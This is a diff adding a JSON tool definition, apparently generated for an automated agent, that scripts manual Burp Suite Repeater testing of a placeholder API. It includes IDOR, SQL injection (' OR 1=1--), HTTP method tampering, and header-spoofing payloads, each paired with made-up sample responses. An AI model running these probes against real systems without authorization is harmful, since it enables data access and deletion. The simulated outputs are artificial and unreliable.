@@ -1,0 +1,34 @@
+{
+  "name": "burp_suite_repeater",
+  "description": "Manual HTTP request modification and replay using Burp Suite Repeater",
+  "pattern": "burp.*repeater|request.*replay|manual.*test|http.*repeat",
+  "parameters": ["request_data", "modification"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Send request from Proxy/Target to Repeater (Ctrl+R or right-click > Send to Repeater)'"]},
+      "expected_output": {"type": "string", "example": "Repeater tab opened with captured request:\n\nGET /api/user/profile?id=123 HTTP/1.1\nHost: api.testsite.com\nCookie: session=abc123xyz\nUser-Agent: Mozilla/5.0\nAccept: application/json\n\nOriginal Response: 200 OK\n{\n  \"id\": 123,\n  \"username\": \"john_doe\",\n  \"email\": \"john@example.com\",\n  \"role\": \"user\"\n}"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Modify parameter: id=123 to id=1 (admin user)' && echo 'Click Send button to replay request'"]},
+      "expected_output": {"type": "string", "example": "Modified request sent:\nGET /api/user/profile?id=1 HTTP/1.1\n\nResponse: 200 OK\n{\n  \"id\": 1,\n  \"username\": \"admin\",\n  \"email\": \"admin@testsite.com\",\n  \"role\": \"administrator\",\n  \"privileges\": [\"read\", \"write\", \"delete\", \"admin\"]\n}\n\nIDOR vulnerability found - can access other users' profiles by changing ID"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Test SQL injection in id parameter' && echo 'Change: id=123 to id=123\\' OR 1=1--'"]},
+      "expected_output": {"type": "string", "example": "Testing SQL injection:\nGET /api/user/profile?id=123' OR 1=1-- HTTP/1.1\n\nResponse: 500 Internal Server Error\n{\n  \"error\": \"Database error: You have an error in your SQL syntax near ''123' OR 1=1--' at line 1\"\n}\n\nSQL injection vulnerability confirmed - database error exposed"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Test authorization bypass by removing session cookie' && echo 'Delete Cookie header and send request'"]},
+      "expected_output": {"type": "string", "example": "Request without authentication:\nGET /api/user/profile?id=123 HTTP/1.1\nHost: api.testsite.com\nUser-Agent: Mozilla/5.0\n[Cookie header removed]\n\nResponse: 401 Unauthorized\n{\n  \"error\": \"Authentication required\",\n  \"message\": \"Please provide valid session token\"\n}\n\nProper authentication enforced - not vulnerable to auth bypass"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Test HTTP method tampering' && echo 'Change GET to DELETE and observe behavior'"]},
+      "expected_output": {"type": "string", "example": "Method changed to DELETE:\nDELETE /api/user/profile?id=123 HTTP/1.1\nHost: api.testsite.com\nCookie: session=abc123xyz\n\nResponse: 200 OK\n{\n  \"success\": true,\n  \"message\": \"User profile deleted\",\n  \"id\": 123\n}\n\nCRITICAL: DELETE method works on read endpoint - can delete users via GET endpoint"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Add malicious headers for testing' && echo 'X-Forwarded-For: 127.0.0.1' && echo 'X-Original-URL: /admin' && echo 'Send modified request'"]},
+      "expected_output": {"type": "string", "example": "Request with additional headers:\nGET /api/user/profile?id=123 HTTP/1.1\nHost: api.testsite.com\nCookie: session=abc123xyz\nX-Forwarded-For: 127.0.0.1\nX-Original-URL: /admin\nX-Custom-IP-Authorization: 127.0.0.1\n\nResponse: 200 OK\n[Admin panel content returned]\n\nHeader injection successful - X-Original-URL bypassed URL-based access controls"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
